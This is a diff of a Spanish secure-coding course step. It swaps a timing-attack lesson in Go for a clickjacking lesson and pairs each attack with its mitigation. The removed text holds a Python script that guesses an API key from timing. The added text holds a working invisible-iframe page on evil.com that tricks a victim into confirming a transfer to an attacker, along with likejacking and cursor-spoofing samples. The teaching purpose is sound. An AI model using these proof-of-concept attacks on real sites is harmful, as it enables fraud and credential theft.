@@ -1,239 +1,207 @@
-# Paso 14 — Timing Attack
-**Tecnologia:** Go | **OWASP:** A02:2021 - Cryptographic Failures | **CWE-208**
+# Paso 15 — Clickjacking
+**Tecnologia:** Go | **OWASP:** A05:2021 - Security Misconfiguration | **CWE-1021**
 
 ---
 
 ## Que es esta vulnerabilidad?
 
-Un timing attack es un ataque de canal lateral donde el atacante mide el tiempo que tarda un servidor en procesar una peticion para deducir informacion sobre datos secretos. El principio se basa en que las operaciones de comparacion de strings en la mayoria de lenguajes terminan en el primer byte diferente: cuantos bytes coincidan al inicio, mas tiempo tarda la comparacion.
+Clickjacking (tambien llamado UI redressing) es un ataque donde un sitio malicioso incrusta la aplicacion victima en un `<iframe>` invisible o semitransparente, superpuesto sobre un elemento atractivo de la pagina del atacante. El usuario cree hacer clic en algo inofensivo ("Ganar un iPhone") pero en realidad su clic actua sobre la aplicacion real subyacente ("Confirmar transferencia bancaria", "Autorizar acceso OAuth", "Eliminar cuenta").
 
-Midiendo suficientes peticiones con diferentes prefijos, un atacante puede reconstruir el secreto correcto byte a byte. Con 256 posibles valores por byte y un secreto de 32 bytes, son necesarios 256 * 32 = 8.192 intentos en lugar de 256^32 (fuerza bruta completa).
+El ataque funciona porque sin proteccion anti-framing, cualquier pagina puede incrustar cualquier URL en un iframe. El atacante controla el CSS para hacer el iframe transparente (`opacity: 0`) y alinear el boton objetivo exactamente con el elemento falso que la victima ve.
 
-En la practica, el ataque requiere un gran numero de muestras para superar el ruido de red y del sistema. En entornos locales (microservicios) donde la latencia es muy baja y estable, el ataque es mas viable. Con hardware especializado y estadisticas avanzadas, se ha demostrado exitoso incluso en redes de area ancha.
+La mitigacion principal son las cabeceras HTTP `X-Frame-Options` y `Content-Security-Policy: frame-ancestors`, que instruyen al navegador a rechazar el renderizado de la pagina dentro de un iframe de otro origen.
 
 ---
 
 ## Donde ocurre en este codigo?
 
-**Archivo:** `src/go/handlers/auth.go`
+**Archivo:** `src/go/handlers/middleware.go`
 
 ```go
 // CODIGO VULNERABLE — estado actual del ejercicio
-func ValidateAPIKey(w http.ResponseWriter, r *http.Request) {
-    provided := r.Header.Get("X-API-Key")
-    expected := getExpectedKey()
-    if provided == expected {  // comparacion que termina en el primer byte diferente
-        w.Write([]byte("authorized"))
-    } else {
-        http.Error(w, "unauthorized", http.StatusUnauthorized)
-    }
+func SecurityHeadersMiddleware(next http.Handler) http.Handler {
+    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+        // Sin ninguna cabecera de seguridad:
+        // - Sin X-Frame-Options: la aplicacion puede ser incrustada en iframes
+        // - Sin X-Content-Type-Options: el navegador puede adivinar MIME types
+        // - Sin Permissions-Policy: la pagina puede acceder a camara, microfono, etc.
+        next.ServeHTTP(w, r)
+    })
 }
 ```
 
-El operador `==` en Go (y en la mayoria de lenguajes) usa comparacion de igualdad eficiente: retorna `false` en cuanto encuentra el primer byte diferente. Esto significa:
-- Si `provided[0] != expected[0]`: retorna inmediatamente (tiempo minimo)
-- Si `provided[0..15] == expected[0..15]` pero `provided[16] != expected[16]`: tarda 16 comparaciones (tiempo mayor)
-
-Esta diferencia de tiempo, aunque en nanosegundos, es estadisticamente detectable.
+Sin `X-Frame-Options` o `Content-Security-Policy: frame-ancestors`, cualquier pagina externa puede incrustar esta aplicacion en un iframe y ejecutar un ataque de clickjacking.
 
 ---
 
 ## Como lo explotaria un atacante
 
-**Ataque de timing para descubrir la API key byte a byte:**
-```python
-import requests, statistics, string, time
-
-def measure_time(prefix: str) -> float:
-    # Medir multiples veces para reducir ruido de red
-    times = []
-    for _ in range(100):
-        start = time.perf_counter_ns()
-        requests.get('https://api.empresa.com/protected',
-                    headers={'X-API-Key': prefix + 'A' * (32 - len(prefix))})
-        times.append(time.perf_counter_ns() - start)
-    return statistics.median(times)
-
-# Descubrir la key caracter por caracter
-discovered = ""
-for position in range(32):
-    best_char = ''
-    best_time = 0
-    for char in string.printable:
-        t = measure_time(discovered + char)
-        if t > best_time:
-            best_time = t
-            best_char = char
-    discovered += best_char
-    print(f"Byte {position}: {best_char} | Descubierto hasta ahora: {discovered}")
+**Pagina de ataque en evil.com:**
+```html
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+  /* El iframe es invisible pero ocupa toda la pantalla */
+  iframe {
+    position: absolute;
+    width: 100%;
+    height: 100%;
+    top: 0;
+    left: 0;
+    opacity: 0;           /* invisible */
+    z-index: 10;          /* encima de todo */
+    pointer-events: all;  /* captura los clics */
+  }
+  /* El boton falso visible se posiciona exactamente sobre el boton real del iframe */
+  #fake-button {
+    position: absolute;
+    top: 300px;
+    left: 200px;
+    z-index: 5;
+    background: green;
+    color: white;
+    padding: 20px;
+  }
+</style>
+</head>
+<body>
+  <div id="fake-button">Haz clic aqui para ganar un iPhone!</div>
+  <!-- El iframe invisible esta encima del boton falso, alineado con "Confirmar" -->
+  <iframe src="https://app.empresa.com/transfer?amount=1000&to=attacker"></iframe>
+</body>
+</html>
 ```
 
-**Precondiciones para el exito:**
-- Conexion de baja latencia y jitter al servidor
-- Servidor sin rate limiting (o rate limiting permisivo)
-- Suficiente entropia estadistica (miles de muestras por byte)
+La victima hace clic en "Ganar un iPhone" pero en realidad confirma una transferencia de 1.000 EUR.
+
+**Clickjacking en flujo OAuth:**
+El atacante puede incrustar la pagina de autorizacion OAuth y forzar al usuario a autorizar una aplicacion maliciosa sin saberlo.
 
 ---
 
 ## Tu tarea: aplicar la mitigacion
 
-Modifica `src/go/handlers/auth.go` para usar comparacion en tiempo constante:
+Modifica `src/go/handlers/middleware.go` para anadir las cabeceras de seguridad necesarias:
 
 ```go
 // CODIGO SEGURO
 package handlers
 
-import (
-    "crypto/subtle"
-    "net/http"
-    "os"
-)
+import "net/http"
 
-func getExpectedKey() string {
-    key := os.Getenv("API_KEY")
-    if key == "" {
-        panic("API_KEY environment variable is required")
-    }
-    return key
-}
+func SecurityHeadersMiddleware(next http.Handler) http.Handler {
+    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+        // Prevenir clickjacking: rechazar iframe desde otros origenes
+        w.Header().Set("X-Frame-Options", "DENY")
 
-func ValidateAPIKey(w http.ResponseWriter, r *http.Request) {
-    provided := r.Header.Get("X-API-Key")
-    expected := getExpectedKey()
+        // Alternativa moderna: CSP frame-ancestors (mas flexible)
+        // w.Header().Set("Content-Security-Policy", "frame-ancestors 'none'")
 
-    // ConstantTimeCompare siempre recorre todos los bytes, nunca cortocircuita
-    // Ademas verifica longitud de forma que no filtra informacion
-    if subtle.ConstantTimeCompare([]byte(provided), []byte(expected)) == 1 {
-        w.Write([]byte("authorized"))
-    } else {
-        http.Error(w, "unauthorized", http.StatusUnauthorized)
-    }
+        // Prevenir MIME sniffing: el navegador no adivina el Content-Type
+        w.Header().Set("X-Content-Type-Options", "nosniff")
+
+        // Limitar acceso a funcionalidades del navegador
+        w.Header().Set("Permissions-Policy", "camera=(), microphone=(), geolocation=()")
+
+        // Forzar HTTPS (HSTS)
+        w.Header().Set("Strict-Transport-Security", "max-age=31536000; includeSubDomains")
+
+        // Politica de referrer
+        w.Header().Set("Referrer-Policy", "strict-origin-when-cross-origin")
+
+        next.ServeHTTP(w, r)
+    })
 }
 ```
 
 ### Por que funciona esta mitigacion?
 
-- **`subtle.ConstantTimeCompare`:** implementada usando operaciones XOR que siempre recorren todos los bytes de ambos strings. El tiempo de ejecucion depende solo de la longitud de los strings, nunca de cuantos bytes coincidan. No hay "cortocircuito" temprano.
-- **Longitud constante:** `ConstantTimeCompare` devuelve `0` si las longitudes son distintas, sin comparar bytes. Esto tambien evita filtrar informacion de longitud aunque el tiempo sea diferente para strings de diferente longitud.
-- **Secreto desde entorno:** carga `API_KEY` desde variable de entorno, nunca hardcodeada en el codigo. Falla con `panic` al arranque si falta, lo que es correcto: mejor fallar en startup que operar sin autenticacion.
+- **`X-Frame-Options: DENY`:** instruccion al navegador de rechazar cualquier intento de cargar esta pagina en un `<frame>`, `<iframe>`, `<embed>` u `<object>`. `DENY` es mas seguro que `SAMEORIGIN` (que permite iframes del mismo dominio).
+- **`X-Content-Type-Options: nosniff`:** previene que el navegador interprete archivos con MIME types diferentes al declarado (evita XSS via subida de archivos con extension `.jpg` pero contenido HTML).
+- **`Permissions-Policy`:** restringe el acceso a APIs sensibles del navegador como camara, microfono y geolocation, reduciendo el impacto de ataques XSS.
+- **`Strict-Transport-Security`:** fuerza conexiones HTTPS para futuras visitas, previniendo downgrade attacks y MITM.
 
 ---
 
-## Variantes de la misma categoria (Cryptographic Failures via Timing — mas complejas)
+## Variantes de la misma categoria (Security Misconfiguration / UI Attacks — mas complejas)
 
-### Variante A: Timing Attack en verificacion de HMAC
+### Variante A: Double Framing para bypass de X-Frame-Options SAMEORIGIN
 
-```python
-# VULNERABLE — comparacion directa de HMAC permite timing attack
-import hmac, hashlib
+`X-Frame-Options: SAMEORIGIN` tiene una vulnerabilidad conocida: si se usa doble framing donde el frame intermedio es del mismo origen, algunos navegadores antiguos permiten el anidamiento.
 
-def verify_webhook(payload: bytes, signature: str, secret: str) -> bool:
-    expected = hmac.new(secret.encode(), payload, hashlib.sha256).hexdigest()
-    return signature == expected  # termina en el primer byte diferente
+```html
+<!-- evil.com incrustar a empresa.com via un intermediario del mismo origen -->
+<iframe src="https://empresa.com/page-that-iframes-app">
+  <!-- empresa.com/page-that-iframes-app contiene: -->
+  <!-- <iframe src="https://empresa.com/transfer"></iframe> -->
+</iframe>
 ```
 
-```python
-# SEGURO — usar hmac.compare_digest (tiempo constante)
-import hmac, hashlib
+Solucion: usar `Content-Security-Policy: frame-ancestors 'none'` en lugar de (o ademas de) `X-Frame-Options`, porque CSP especifica la cadena completa de ancestors, no solo el padre directo.
 
-def verify_webhook(payload: bytes, signature: str, secret: str) -> bool:
-    expected = hmac.new(secret.encode(), payload, hashlib.sha256).hexdigest()
-    return hmac.compare_digest(signature, expected)  # tiempo constante
 ```
-
-`hmac.compare_digest` en Python es el equivalente de `subtle.ConstantTimeCompare` en Go. Usa XOR interno sobre todos los bytes.
-
----
-
-### Variante B: Username Enumeration via diferencia de tiempo
-
-```java
-// VULNERABLE — fallar rapido si el usuario no existe, lento si la contrasena es incorrecta
-@PostMapping("/login")
-public ResponseEntity<?> login(@RequestParam String username, @RequestParam String password) {
-    User user = userRepository.findByUsername(username);  // consulta a DB
-    if (user == null) {
-        return ResponseEntity.status(401).build();  // respuesta rapida: usuario no existe
-    }
-    // bcrypt.verify tarda ~100ms: respuesta lenta si contrasena incorrecta
-    if (!bcrypt.verify(password, user.getPasswordHash())) {
-        return ResponseEntity.status(401).build();
-    }
-    return ResponseEntity.ok(generateToken(user));
-}
-```
-
-El atacante puede distinguir "usuario no existe" (respuesta rapida) de "usuario existe pero contrasena incorrecta" (respuesta lenta) por diferencia de tiempo, enumerando usuarios validos.
-
-```java
-// SEGURO — tiempo constante independientemente de si el usuario existe
-@PostMapping("/login")
-public ResponseEntity<?> login(@RequestParam String username, @RequestParam String password) {
-    User user = userRepository.findByUsername(username);
-    String hashToVerify = (user != null)
-        ? user.getPasswordHash()
-        : "$2a$10$dummy_hash_to_waste_same_time_as_real_verification";
-    // Siempre ejecutar bcrypt.verify para mantener tiempo constante
-    boolean valid = bcrypt.verify(password, hashToVerify) && user != null;
-    if (!valid) {
-        return ResponseEntity.status(401).build();
-    }
-    return ResponseEntity.ok(generateToken(user));
-}
+# SEGURO — CSP frame-ancestors impide toda cadena de anidamiento
+Content-Security-Policy: frame-ancestors 'none'
 ```
 
 ---
 
-### Variante C: Padding Oracle Attack (CBC decryption oracle)
+### Variante B: Likejacking en redes sociales
 
-Un padding oracle es una forma avanzada de timing/error attack donde el servidor revela si el padding de un bloque AES-CBC es valido:
+Variante de clickjacking especifica para botones de "Me gusta" o "Compartir" en redes sociales:
 
-```java
-// VULNERABLE — el servidor devuelve errores diferentes para padding invalido vs. MAC invalido
-@PostMapping("/decrypt")
-public ResponseEntity<?> decrypt(@RequestBody String ciphertext) {
-    try {
-        byte[] decrypted = aesCbcDecrypt(ciphertext);
-        return ResponseEntity.ok(decrypted);  // OK: padding y MAC validos
-    } catch (BadPaddingException e) {
-        return ResponseEntity.status(400).body("Invalid padding");  // filtra info de padding
-    } catch (InvalidMACException e) {
-        return ResponseEntity.status(400).body("Invalid MAC");  // respuesta diferente
-    }
+```html
+<!-- El atacante superpone un iframe de Facebook Like sobre contenido atractivo -->
+<style>
+  iframe { opacity: 0.001; position: absolute; top: 100px; left: 250px; }
+</style>
+<p>Haz clic para ver el video exclusivo:</p>
+<button>VER VIDEO</button>
+<iframe src="https://www.facebook.com/plugins/like.php?href=http%3A%2F%2Fevil.com%2F">
+</iframe>
+```
+
+Cada clic en "VER VIDEO" en realidad da "Me gusta" al contenido del atacante en Facebook.
+
+Mitigacion: los proveedores de botones sociales deben implementar `X-Frame-Options` o CSP en sus endpoints de plugins. Los desarrolladores de aplicaciones deben anadir las cabeceras en todos sus endpoints.
+
+---
+
+### Variante C: Cursor Spoofing via CSS
+
+Variante que no requiere iframe: el atacante usa CSS para mostrar un cursor falso que apunta a un lugar diferente de donde el usuario cree que esta haciendo clic:
+
+```css
+/* ATAQUE: cursor falso que apunta 200px a la izquierda del cursor real */
+body {
+    cursor: none;  /* ocultar cursor real */
+}
+body::after {
+    content: url('cursor-image.png');
+    position: fixed;
+    pointer-events: none;
+    /* La imagen del cursor falso aparece desplazada del cursor real */
+    transform: translate(-200px, 0px);
 }
 ```
 
-Con esta diferencia de errores, un atacante puede descifrar cualquier ciphertext byte a byte sin conocer la clave (ataque de Vaudenay, 2002).
-
-```java
-// SEGURO — usar AEAD (AES-GCM) en lugar de AES-CBC + HMAC separado
-// AES-GCM verifica integridad y descifra en una sola operacion atomica
-// Si el tag de autenticacion falla, no hay ninguna informacion de padding
-@PostMapping("/decrypt")
-public ResponseEntity<?> decrypt(@RequestBody String ciphertext) {
-    try {
-        byte[] decrypted = aesGcmDecrypt(ciphertext);  // AEAD: un solo error generico
-        return ResponseEntity.ok(decrypted);
-    } catch (AEADBadTagException e) {
-        return ResponseEntity.status(400).body("Decryption failed");  // error generico
-    }
-}
-```
+Mitigacion en el servidor: `Content-Security-Policy: style-src 'self'` impide CSS externo. `Permissions-Policy` puede restringir CSS custom cursors en navegadores que implementen la directiva.
 
 ---
 
 ## Referencias
 
-- [OWASP A02:2021 - Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/)
-- [CWE-208: Observable Timing Discrepancy](https://cwe.mitre.org/data/definitions/208.html)
-- [Go crypto/subtle documentation](https://pkg.go.dev/crypto/subtle)
-- [Padding Oracle Attack - Vaudenay 2002](https://www.iacr.org/archive/eurocrypt2002/23320530/cbc02_e02d.pdf)
+- [OWASP A05:2021 - Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
+- [CWE-1021: Improper Restriction of Rendered UI Layers](https://cwe.mitre.org/data/definitions/1021.html)
+- [OWASP Clickjacking Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
+- [Mozilla MDN - X-Frame-Options](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options)
 
 ---
 
 ## Lo que valida el workflow automaticamente
 
-El workflow **Validate Step 14** exige que `src/go/handlers/auth.go` contenga:
-- `subtle.ConstantTimeCompare`
-- `os.Getenv("API_KEY")`
-- La ausencia de `provided == expected`
+El workflow **Validate Step 15** exige que `src/go/handlers/middleware.go` contenga:
+- `X-Frame-Options`
+- `X-Content-Type-Options`
+- `Permissions-Policy`
